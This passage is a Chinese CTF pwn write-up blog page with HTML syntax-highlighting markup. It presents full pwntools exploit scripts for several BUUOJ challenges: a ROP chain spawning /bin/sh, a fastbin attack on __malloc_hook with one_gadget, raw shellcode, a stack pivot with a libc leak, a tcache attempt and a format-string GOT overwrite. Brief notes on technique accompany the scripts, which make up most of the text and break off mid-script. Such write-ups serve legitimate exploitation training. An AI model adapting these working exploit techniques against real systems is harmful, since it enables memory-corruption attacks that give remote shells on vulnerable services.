class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br>r.sendline(p)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn">roarctf_2019_easy_pwn</h3><p>off-by-one漏洞，然后chunk extend，先求得main_arena附近的地址（靠unsortbin）,main_arena地址可由ida看libc里面的malloc_trim函数的v22得，得到base后，改个chunk的size为0x71(特定的)，里面fd填hook-偏移（靠偏移的7f作为size绕过检查）的地址，申请两次后，后一个chunk分配到hook附近，然后fill，由于在malloc里填og打不通，所以改为malloc_hook前一个的realloc填og，而原本的malloc_hook中写realloc中push的地址，最后好像realloc会先push再跳转到realloc上的地址。这题写了我两天orz（最后就是，本地EOF，远端却打得通）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29536</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>create(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0xD1</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0xc0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#----------------------------------------</span><br>main_arena=<span class="hljs-number">0x3C4B20</span><br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>rc(<span class="hljs-number">0x40</span>)<br>addr=u64(rc(<span class="hljs-number">8</span>))<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#print hex(addr)</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x80</span>)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x21</span>))<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(shell)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>create(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode">mrctf2020_shellcode</h3><p>NX没开，看不了汇编，但直接shellcode就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26373</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-borrowstack">gyctf_2020_borrowstack</h3><p><strong>关键词</strong>：栈迁移</p><p>使用可控制的地址覆盖ebp的值，使用leave;ret指令所在地址覆盖ret的值，迁移后要填充4或8</p><p>read的时候用send</p><p>这题首先注意：</p><p>1.bss段离plt，got很近，要适当抬高迁移的位置</p><p>3.用system拿,估计还得要栈迁移，麻烦，用og简单，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26005</span>)<br><span class="hljs-comment">#r=process(&#x27;./gyctf_2020_borrowstack&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400703</span><br>leave_ret=<span class="hljs-number">0x400699</span><br>ret=<span class="hljs-number">0x004004c9</span><br>bank=<span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;me what you want&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(bank+<span class="hljs-number">0xa0</span>)+p64(leave_ret))<br>r.recvuntil( <span class="hljs-string">&#x27;borrow stack now!&#x27;</span>)<br>r.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x14</span>+p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>r.recvline()<br>puts=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br>base=puts-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>one_gadget=base+og[<span class="hljs-number">1</span>]<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(one_gadget))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="lonelywolf">lonelywolf</h3><p>以后遇到题目可以先看看libc版本，不一样的需要改链接</p><p>strings libc的名字 | grep LIBC</p><p>可以查看libc版本</p><p>这题我的版本与国赛libc链接版本不一样，需要改库链接</p><p>ldd查看elf的ld和libc</p><p>patchelf --set-interpreter （）-–set-rpath （）（）</p><p>两个参数要换成自己本地对应的路径，</p><p>–set-interpreter 后面跟的是ld.so的路径，</p><p>–set-rpath 后面跟的是文件夹路径，</p><p>最后加上你想要更换glibc版本的程序名称</p><p>一次失败的复现</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import *<br>local_file  = <span class="hljs-string">&#x27;./lonelywolf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = <span class="hljs-variable constant_">ELF</span>(local_libc)<br><span class="hljs-symbol">else:</span><br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = <span class="hljs-variable constant_">ELF</span>(remote_libc)<br><br>elf = <span class="hljs-variable constant_">ELF</span>(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendlineafter(delim, data)<br>sea     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>rc      = <span class="hljs-built_in">lambda</span> numb=<span class="hljs-number">4096</span>          <span class="hljs-symbol">:r</span>.recv(numb)<br>rl      = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:r</span>.recvline()<br>ru      = <span class="hljs-built_in">lambda</span> delims                         <span class="hljs-symbol">:r</span>.recvuntil(delims)<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-built_in">lambda</span> tag, addr        <span class="hljs-symbol">:r</span>.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,str(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,str(text))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-comment">#---------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;by pass check&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>heap=uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-symbol">:-</span><span class="hljs-number">1</span>])<br>print hex(heap)<br><span class="hljs-comment">#--------------------------------------------------------------</span><br>head=heap-<span class="hljs-number">0x250</span><br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,p64(head))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">0x23</span>+<span class="hljs-string">&#x27;\xff&#x27;</span>)<br><span class="hljs-comment">#delete(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-comment">#allocate(0x80)</span><br><span class="hljs-comment">#delete(1)</span><br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt32">axb_2019_fmt32</h3><p><strong>关键词</strong>：格式化字符串漏洞</p><p><strong>思路</strong>：</p><p>这题自带循环，没有栈溢出的地方，而且got表可写</p><p>进行两次格式化字符串漏洞利用，和一次填写</p><p>1.第一次造成任意读，泄露puts的got表，进而泄露libc</p><p>2.第二次造成任意写，把strlen的got表改为system</p><p>3.第三次写入;/bin/sh,就能开shell</p><p><strong>注意点</strong>：</p><p>1.这题alarm为3秒，为方便分析，先使其失效</p><p><a href="https://blog.csdn.net/A951860555/article/details/111214951">ctf - pwn题之alarm函数_lifanxin的博客-CSDN博客</a>有三种方法</p><p>我用其中一种，用vim打开文件</p><p>打开后直接输入/alarm进行搜索</p><p>找到后回车，按下i进行编辑，更改为isnan</p><p>2.多次运行程序调试测定偏移（包括第二次）</p><p>3.第二次格式化字符串利用中，不能一次写进4字地址，分两次，strlen地址的前后顺序由大小决定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27679</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf=ELF(<span class="hljs-string">&#x27;./axb_2019_fmt32&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+<span class="hljs-string">&#x27;%8$s&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.recv(<span class="hljs-number">5</span>)<br>got=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#--------------------------------</span><br>strlen=elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>high_sys=(sys&gt;&gt;<span class="hljs-number">16</span>)<br>low_sys=sys&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span 